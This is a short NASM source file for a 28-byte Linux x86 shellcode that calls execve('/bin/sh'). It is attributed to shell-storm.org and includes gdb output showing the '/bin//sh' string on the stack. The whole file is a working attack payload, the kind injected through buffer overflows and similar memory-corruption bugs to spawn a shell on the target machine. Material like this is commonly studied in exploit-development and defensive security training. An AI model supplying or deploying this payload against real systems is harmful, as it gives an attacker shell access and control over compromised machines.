;source code :http://shell-storm.org/shellcode/files/shellcode-811.php
;original nasm file 

;Title:	Linux x86 execve("/bin/sh") - 28 bytes
;Author:	Jean Pascal Pereira <pereira@secbiz.de>
;Web:	http://0xffe4.org

;(gdb)
;0x8000202f in shellcode ()
;2: /x $ebx = 0xbffff660
;1: /x $esp = 0xbffff660
;(gdb) x/s 0xbffff660
;0xbffff660:     "/bin//sh"


global _start			

section .text

_start:
 xor    eax,eax
 push   eax
 push   0x68732f2f
 push   0x6e69622f
 mov    ebx,esp
 mov    ecx,eax
 mov    edx,eax
 mov    al,0xb
 int    0x80
 xor    eax,eax
 inc    eax
 int    0x80

